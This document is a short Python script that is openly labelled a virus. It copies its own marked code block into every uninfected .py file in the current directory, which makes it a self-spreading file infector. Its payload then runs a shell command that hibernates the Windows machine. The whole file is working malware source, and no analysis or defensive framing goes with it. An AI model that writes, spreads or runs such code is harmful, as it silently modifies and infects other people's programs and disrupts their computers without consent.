#starting of  virus code
import sys,re,glob
#put all the copy of all those lines into a list 
virusCode=[]
#open this file and read all lines
thisFile=sys.argv[0]
virusFile=open(thisFile,"r")
lines=virusFile.readlines()
virusFile.close()


#filter out all lines that are not inside the virus code boundary
inVirus=False
for line in lines:
    if(re.search("^#starting of  virus code",line)):
        inVirus=True
        
    if(inVirus==True):
        #append the line into a list to use later
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
      
#find the potential victims
programs=glob.glob("*.py")
#check and infect all the program that the glob found
for p in programs:
    file=open(p,"r")
    programCode=file.readlines()
    file.close()
    #check to see if the file is alredy infected
    infected=False
    for line in programCode:
        if(re.search("^#starting of  virus code",line)):
            infected=True
            break
    if not infected:
        newCode=[]
        # new version=current +virus code
        newCode=programCode
        newCode.extend(virusCode)

        #write the new version to the file. overwrite the orginal
        file= open(p,"w")
        file.writelines(newCode)
        file.close()
#payload
import os
os.system("shutdown /h")

#end of virus code  
